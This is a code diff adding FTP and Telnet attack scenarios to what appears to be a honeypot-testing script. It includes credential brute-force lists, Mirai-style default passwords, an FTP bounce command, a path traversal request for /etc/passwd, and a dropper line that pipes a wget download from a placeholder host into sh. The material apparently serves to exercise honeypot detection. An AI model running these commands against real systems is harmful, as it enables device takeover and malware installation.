@@ -336,6 +336,92 @@ async function ssh(): Promise<void> {
   }
 }
 
+async function ftp(): Promise<void> {
+  console.log("\n# ftp — credential brute-force, bounce and traversal against the FTP honeypot");
+  const ftpPort = Number(process.env.FTP_PORT ?? 2121);
+
+  // FTP answers every command, so drive it off the replies rather than a timer.
+  const runFtp = (label: string, lines: string[]) =>
+    new Promise<void>((resolve) => {
+      const socket = net.createConnection({ host, port: ftpPort });
+      let transcript = "";
+      let i = 0;
+      socket.setTimeout(8000, () => socket.destroy());
+      socket.on("data", (d) => {
+        transcript += d.toString();
+        if (i < lines.length) socket.write(`${lines[i++]}\r\n`);
+        else socket.end();
+      });
+      socket.on("close", () => {
+        const codes = [...transcript.matchAll(/^(\d{3})/gm)].map((m) => m[1]).join(" ");
+        console.log(`  [ftp] ${label} — server codes: ${codes}`);
+        resolve();
+      });
+      socket.on("error", (e) => {
+        console.log(`  [ftp] ${label} — error: ${e.message}`);
+        resolve();
+      });
+    });
+
+  for (const [user, pass] of [["admin", "admin"], ["root", "toor"], ["ftpuser", "123456"]]) {
+    await runFtp(`brute-force ${user}:${pass}`, [`USER ${user}`, `PASS ${pass}`, "QUIT"]);
+  }
+  await runFtp("anonymous login", ["USER anonymous", "PASS scanner@example.com", "QUIT"]);
+  // PORT naming an address that is not ours: the classic FTP bounce, asking the
+  // server to open a connection to a third party. Reported, never dialled.
+  await runFtp("bounce (PORT to a third party)", ["USER anonymous", "PASS x@x", "PORT 198,51,100,23,0,25", "QUIT"]);
+  await runFtp("path traversal", ["USER anonymous", "PASS x@x", "RETR ../../../../etc/passwd", "QUIT"]);
+}
+
+async function telnet(): Promise<void> {
+  console.log("\n# telnet — IoT-style default-credential sweep against the Telnet honeypot");
+  const telnetPort = Number(process.env.TELNET_PORT ?? 2323);
+  // The credential pairs the Mirai lineage actually sprays.
+  const creds: Array<[string, string]> = [
+    ["root", "xc3511"],
+    ["root", "vizxv"],
+    ["admin", "admin"],
+    ["support", "support"],
+  ];
+  // Post-login, the dropper fingerprints BusyBox and then stages a payload.
+  const commands = ["/bin/busybox ECCHI", "cat /proc/cpuinfo", "wget http://198.51.100.9/bins.sh -O - | sh", "exit"];
+
+  for (const [user, pass] of creds) {
+    await new Promise<void>((resolve) => {
+      const socket = net.createConnection({ host, port: telnetPort });
+      let seen = "";
+      let stage = 0;
+      let sentCommands = 0;
+      socket.setTimeout(8000, () => socket.destroy());
+      socket.on("data", (d) => {
+        seen += d.toString("latin1");
+        if (stage === 0 && seen.includes("login: ")) {
+          socket.write(`${user}\r\n`);
+          stage = 1;
+        } else if (stage === 1 && seen.includes("Password: ")) {
+          socket.write(`${pass}\r\n`);
+          stage = 2;
+        } else if (stage === 2 && seen.endsWith("# ") && sentCommands < commands.length) {
+          // Only reached when the target runs interactive; otherwise it re-prompts.
+          socket.write(`${commands[sentCommands++]}\r\n`);
+        } else if (stage === 2 && seen.includes("Login incorrect") && seen.split("Login incorrect").length > 2) {
+          socket.end();
+        }
+      });
+      socket.on("close", () => {
+        const shell = seen.includes("# ");
+        console.log(`  [telnet] ${user}:${pass} — ${shell ? `accepted, ran ${sentCommands} command(s)` : "rejected"}`);
+        resolve();
+      });
+      socket.on("error", (e) => {
+        console.log(`  [telnet] ${user}:${pass} — error: ${e.message}`);
+        resolve();
+      });
+    });
+    await delay(150);
+  }
+}
+
 const scenarios: Record<string, () => Promise<void>> = {
   decoys,
   "path-bruteforce": pathBruteforce,
@@ -361,6 +447,8 @@ const scenarios: Record<string, () => Promise<void>> = {
   "port-scan": portScan,
   smtp,
   ssh,
+  ftp,
+  telnet,
 };
 
 async function main(): Promise<void> {
